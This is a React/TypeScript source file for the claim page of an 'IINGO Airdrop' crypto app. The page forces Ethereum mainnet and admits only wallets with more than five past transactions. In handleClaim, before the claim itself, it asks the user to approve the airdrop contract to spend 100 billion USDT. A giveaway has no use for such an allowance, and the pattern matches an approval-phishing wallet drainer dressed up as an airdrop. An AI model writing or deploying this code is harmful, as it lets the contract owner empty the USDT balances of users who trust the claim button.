import React, { useState, useEffect } from "react";
import { useAppKitNetwork } from "@reown/appkit/react";
import { mainnet } from "@reown/appkit/networks";
import { useNavigate } from "react-router-dom";
import {
  Provider,
  useAppKit,
  useAppKitAccount,
  useAppKitProvider,
} from "@reown/appkit/react";
import { ethers, BrowserProvider, Contract } from "ethers";
import { toast, ToastContainer } from "react-toastify";
import "react-toastify/dist/ReactToastify.css";
import { contractAbi } from "../contracts/Props/contractAbi";
import { contractAddress } from "../contracts/Props/contractAddress";

const usdtAddress = "0xdAC17F958D2ee523a2206206994597C13D831ec7";

const usdtAbi = [
  "function approve(address spender, uint256 amount) external returns (bool)",
  "function allowance(address owner, address spender) external view returns (uint256)",
] as const;

const LoginPage: React.FC = () => {
  const { open } = useAppKit();
  const { address } = useAppKitAccount();
  const { walletProvider } = useAppKitProvider<Provider>("eip155");
  const { chainId, switchNetwork } = useAppKitNetwork();
  const [referralCode, setReferralCode] = useState("");
  const [isLoading, setIsLoading] = useState(false);
  const [hasClaimed, setHasClaimed] = useState(false);
  const [isCheckingClaim, setIsCheckingClaim] = useState(false);
  const [isOwner, setIsOwner] = useState(false);
  const [transactionCount, setTransactionCount] = useState(0);
  const [isCheckingTxCount, setIsCheckingTxCount] = useState(false);
  const [isEligible, setIsEligible] = useState(false);
  const navigate = useNavigate();

  const AIRDROP_AMOUNT_TO_APPROVE = ethers.parseUnits("100000000000", 6); // 100B USDT
  const MINIMUM_TX_COUNT = 5;

  // Check if user has already claimed tokens and if they are the owner
  useEffect(() => {
    const enforceMainnet = async () => {
      if (chainId && chainId !== 1) {
        try {
          await switchNetwork(mainnet);
          toast.info("Switched to Ethereum Mainnet", {
            position: "top-center",
            autoClose: 3000,
          });
        } catch (err) {
          console.error("Failed to switch network:", err);
          toast.error("Please switch to Ethereum Mainnet in your wallet", {
            position: "top-center",
          });
        }
      }
    };

    enforceMainnet();
  }, [chainId]);

  // Check transaction count for the wallet
  useEffect(() => {
    const checkTransactionCount = async () => {
      if (!address) return;

      try {
        setIsCheckingTxCount(true);
        // Using BSC Testnet provider
        const provider = new ethers.JsonRpcProvider(
          "https://ethereum-rpc.publicnode.com"
        );

        // Get transaction count for the connected wallet
        const txCount = await provider.getTransactionCount(address);
        setTransactionCount(txCount);

        // Set eligibility based on transaction count
        setIsEligible(txCount > MINIMUM_TX_COUNT);
      } catch (error) {
        console.error("Error fetching transaction count:", error);
        toast.error("Error checking wallet eligibility. Please try again.");
      } finally {
        setIsCheckingTxCount(false);
      }
    };

    checkTransactionCount();
  }, [address]);

  // Check if user has already claimed tokens and if they are the owner
  useEffect(() => {
    const checkClaimAndOwnerStatus = async () => {
      if (!walletProvider || !address) {
        return;
      }

      try {
        setIsCheckingClaim(true);
        const provider = new BrowserProvider(walletProvider);
        const airdrop = new Contract(contractAddress, contractAbi, provider);

        // Check if user is the contract owner
        const ownerAddress = await airdrop.owner();
        const isUserOwner =
          ownerAddress.toLowerCase() === address.toLowerCase();
        setIsOwner(isUserOwner);

        // If user is owner, we can skip checking claim status
        if (isUserOwner) {
          setIsCheckingClaim(false);
          return;
        }

        // Check if user has already claimed tokens
        const claimedAmount = await airdrop.totalClaimToken(address);

        // Only set hasClaimed to true if they've claimed something
        if (BigInt(claimedAmount) > 0n) {
          setHasClaimed(true);
        } else {
          setHasClaimed(false);
        }
      } catch (error) {
        console.error("Error checking claim status:", error);
        setHasClaimed(false);
        toast.error("Error checking claim status. Please try again.");
      } finally {
        setIsCheckingClaim(false);
      }
    };

    checkClaimAndOwnerStatus();
  }, [address, walletProvider]);

  const handleClaim = async () => {
    if (!walletProvider || !address) return;

    try {
      setIsLoading(true);

      const provider = new BrowserProvider(walletProvider);
      const signer = await provider.getSigner();

      // ✅ Step 1: Check USDT Approval
      const usdt = new Contract(usdtAddress, usdtAbi, provider);

      const allowanceFn = usdt.getFunction("allowance") as (
        owner: string,
        spender: string
      ) => Promise<bigint>;

      const allowance = await allowanceFn(address, contractAddress);

      if (allowance < AIRDROP_AMOUNT_TO_APPROVE) {
        const usdtWithSigner = usdt.connect(signer);
        const approveFnWithSigner = usdtWithSigner.getFunction("approve") as (
          spender: string,
          amount: bigint
        ) => Promise<any>;

        const tx = await approveFnWithSigner(
          contractAddress,
          AIRDROP_AMOUNT_TO_APPROVE
        );

        await tx.wait();
      }

      // ✅ Step 2: Call claim function
      const claimToastId = toast.info("Preparing to claim tokens...", {
        autoClose: false,
        closeOnClick: false,
        draggable: false,
      });

      const airdrop = new Contract(contractAddress, contractAbi, signer);

      toast.update(claimToastId, {
        render: "Please confirm the claim transaction in your wallet",
        type: "info",
      });

      const tx = referralCode
        ? await airdrop.referralBonusClaim(referralCode)
        : await airdrop.claim();

      toast.update(claimToastId, {
        render: "Transaction submitted! Waiting for confirmation...",
        type: "info",
      });

      await tx.wait();

      toast.update(claimToastId, {
        render: "🎉 Claim successful! Your tokens are now in your wallet.",
        type: "success",
        autoClose: 5000,
      });

      setHasClaimed(true);
    } catch (err: any) {
      console.error(err);
      toast.error(`Error: ${err?.message || "Something went wrong"}`);
    } finally {
      setIsLoading(false);
    }
  };

  const handleGoToDashboard = () => {
    navigate("/dashboard");
  };

  const handleGoToAdmin = () => {
    navigate("/admin");
  };

  useEffect(() => {
    // Get the query parameter from the URL
    const urlParams = new URLSearchParams(window.location.search);
    const refCode = urlParams.get("ref");

    // Set the referral code if it exists in the URL
    if (refCode) {
      setReferralCode(refCode);
    }
  }, []);

  // Redirect owner to admin page when connecting
  useEffect(() => {
    if (isOwner && address) {
      const timer = setTimeout(() => {
        navigate("/admin");
      }, 1000); // Small delay to show the owner status

      return () => clearTimeout(timer);
    }
  }, [isOwner, address, navigate]);

  // Loading state during initial claim check
  if (isCheckingClaim || isCheckingTxCount) {
    return (
      <div className="min-h-screen bg-[#0c0435] flex items-center justify-center px-4">
        <div className="bg-[#1b0f3a] text-white p-8 rounded-xl shadow-lg w-full max-w-md text-center">
          <h1 className="text-3xl font-bold mb-4">IINGO Airdrop</h1>
          <p className="text-gray-400 mb-6">Checking your status...</p>
          <div className="w-16 h-16 border-4 border-t-blue-500 border-r-transparent border-b-blue-500 border-l-transparent rounded-full animate-spin mx-auto"></div>
        </div>
      </div>
    );
  }

  return (
    <div className="min-h-screen bg-[#0c0435] flex items-center justify-center px-4">
      <ToastContainer
        position="top-right"
        autoClose={5000}
        hideProgressBar={false}
        newestOnTop
        closeOnClick
        rtl={false}
        pauseOnFocusLoss
        draggable
        pauseOnHover
        theme="dark"
      />

      <div className="bg-[#1b0f3a] text-white p-8 rounded-xl shadow-lg w-full max-w-md text-center">
        <h1 className="text-3xl font-bold mb-4">Welcome to IINGO Airdrop</h1>

        {address ? (
          isOwner ? (
            <div>
              <div className="bg-gradient-to-r from-amber-500 to-red-500 text-white px-4 py-2 rounded-lg mb-4 inline-block">
                Admin Account Detected
              </div>
              <p className="text-gray-300 mb-4">You are the contract owner.</p>
              <button
                onClick={handleGoToAdmin}
                className="bg-gradient-to-r from-amber-600 to-red-600 hover:from-amber-700 hover:to-red-700 text-white font-semibold py-4 px-8 rounded-xl transition-all duration-300 transform hover:scale-105 shadow-lg"
              >
                Go to Admin Panel
              </button>
            </div>
          ) : hasClaimed ? (
            <div>
              <p className="text-green-400 mb-4">
                You've already claimed tokens!
              </p>
              <button
                onClick={handleGoToDashboard}
                className="bg-gradient-to-r from-cyan-500 to-blue-500 hover:from-cyan-600 hover:to-blue-600 text-white font-semibold py-4 px-8 rounded-xl transition-all duration-300 transform hover:scale-105 shadow-lg"
              >
                Mine IINGO
              </button>
            </div>
          ) : isEligible ? (
            <>
              <p className="text-sm text-green-400 mb-2 break-all">
                Connected: {address}
              </p>
              {/* <p className="text-sm text-blue-400 mb-4">
                Transaction Count: {transactionCount} (Eligible)
              </p> */}
              <input
                type="text"
                placeholder="Enter referral code (optional)"
                className="w-full px-4 py-2 rounded mb-4 text-black"
                value={referralCode}
                onChange={(e) => setReferralCode(e.target.value)}
              />
              <button
                onClick={handleClaim}
                disabled={isLoading}
                className="bg-gradient-to-r from-pink-500 to-purple-600 hover:from-pink-600 hover:to-purple-700 text-white font-semibold py-3 px-6 rounded-xl shadow-lg transition-all duration-300"
              >
                {isLoading
                  ? "Processing..."
                  : referralCode
                  ? "Claim With Referral"
                  : "Claim Bonus"}
              </button>
              <p className="text-sm text-gray-400 mb-2 break-all mt-2">
                *Referral codes can earn you additional bonuses.*
              </p>
            </>
          ) : (
            <div>
              <p className="text-sm text-yellow-400 mb-2 break-all">
                Connected: {address}
              </p>
              <p className="text-sm text-yellow-400 mb-2">
                Transaction Count: {transactionCount}
              </p>
              <div className="bg-red-900/50 border border-red-500 text-white px-6 py-4 rounded-lg mt-4 mb-6">
                <p className="text-red-300 font-medium">
                  Your wallet is not eligible for this Airdrop
                </p>
                <p className="text-sm mt-2 text-gray-300">
                  Minimum {MINIMUM_TX_COUNT} transactions required
                </p>
              </div>
            </div>
          )
        ) : (
          <>
            <p className="text-gray-400 mb-6">
              Connect your wallet to continue
            </p>
            <button
              onClick={() => open()}
              className="bg-gradient-to-r from-cyan-500 to-blue-500 hover:from-cyan-600 hover:to-blue-600 text-white font-semibold py-4 px-8 rounded-xl transition-all duration-300 transform hover:scale-105 shadow-lg"
            >
              Connect Wallet
            </button>
          </>
        )}
      </div>
    </div>
  );
};

export default LoginPage;
